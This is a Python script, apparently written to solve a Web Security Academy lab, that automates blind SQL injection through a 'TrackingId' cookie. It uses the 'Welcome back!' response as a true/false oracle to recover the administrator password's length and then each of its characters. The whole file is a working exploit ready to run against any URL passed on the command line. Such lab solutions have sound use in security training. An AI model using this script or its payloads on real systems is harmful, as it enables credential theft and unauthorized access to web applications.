import string
import requests
import sys

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}


def fire_payload(cookies, url):
    if "Welcome back!" in requests.get(url=url, cookies=cookies).text:
        return True


def username(cookies, url):
    for char in string.ascii_lowercase:
        payload = f"' AND ( SELECT '{char}' from users LIMIT 1) = '{char}"
        cookies['TrackingId'] = cookies['TrackingId'] + payload
        if fire_payload(cookies, url):
            print(f"[+] Username = {char}")
            return True


def pw_take(url, cookies, length):
    pw = ''
    pos = 1
    charset = string.digits + string.ascii_letters
    while pos <= length:
        for char in charset:
            #payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}"
            payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {pos}, 1) = '{char}"
            temp_cookies = cookies.copy()
            temp_cookies['TrackingId'] += payload
            print(f"[-] Password = {pw + char}", flush=True, end="\r")
            if fire_payload(temp_cookies, url):
                pw += char
                pos += 1
                break
    print(f"[+] Password = {pw}", flush=True)


def pw_length(url, cookies):
    for i in range(1, 50):
        payload = f"' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{i})='a"
        temp_cookies = cookies.copy()
        temp_cookies['TrackingId'] += payload
        print(f"[-] Testing pw length = {i}",flush=True, end="\r")
        if not fire_payload(temp_cookies, url):
            print(f"[-] Testing pw length = {i}")
            return i


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        # url = "https://ac561fd61f9b46b1804821df004100ab.web-security-academy.net/"
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url>")
        print(f"[-] Example: {sys.argv[0]} http://web-security-academy.net/")
        sys.exit(-1)
    s = requests.Session().get(url=url)
    cookies = s.cookies.get_dict()

    print("[*] Web-Security-Academy BlindSqlInjection")
    print("[+] Blind Sqli Successful!")
    num = pw_length(url, cookies)
    if num:
        print(f"[+] Password Length = {num}")
        print("[+] Getting the Password")
        pw_take(url, cookies, num)
    else:
        print("[-] Blind Sqli Failed!")